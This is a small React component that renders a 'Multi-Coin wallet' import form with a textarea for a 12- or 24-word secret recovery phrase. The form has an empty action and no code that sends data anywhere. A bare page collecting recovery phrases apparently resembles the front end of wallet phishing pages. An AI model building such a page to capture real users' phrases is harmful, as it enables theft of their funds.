import React from 'react'
import styled from 'styled-components'

const FormCont = styled.div`
    width: 100%;
    height: 100vh;
    border: 11px solid #000;
`
function Form() {
  return (
    <FormCont>
        <h2>Multi-Coin wallet</h2>
        <form action="">
            <input type="text" />
            <textarea name="" id="" cols="30" rows="10" placeholder="secret Phrase">

            </textarea>
            <p>Typically 12 (sometimes 24) words separated by single spaces</p>

            <button>Import</button>
        </form>
    </FormCont>
  )
}

export default Form